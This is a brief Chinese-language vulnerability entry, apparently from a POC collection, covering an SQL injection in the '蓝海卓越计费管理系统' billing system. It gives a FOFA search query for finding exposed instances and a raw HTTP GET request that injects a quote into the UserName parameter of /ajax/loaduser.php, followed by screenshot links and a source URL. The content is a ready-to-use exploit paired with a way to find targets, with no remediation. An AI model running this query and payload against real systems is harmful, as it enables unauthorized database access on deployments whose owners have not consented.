## 蓝海卓越计费管理系统SQL注入漏洞



## fofa

```
title=="蓝海卓越计费管理系统"
```



## poc

```
GET /ajax/loaduser.php?UserName=aaa%27 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: keep-alive
Cookie: PHPSESSID=r1me93qh1lsje0ece8n0ma9c54
Host: your-ip
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
```

![image-20240523194234425](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405231942480.png)

![image-20240523194330249](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405231943309.png)

## 漏洞来源

- https://mp.weixin.qq.com/s/aUB1XBvGcSFDFgfd-IG8tA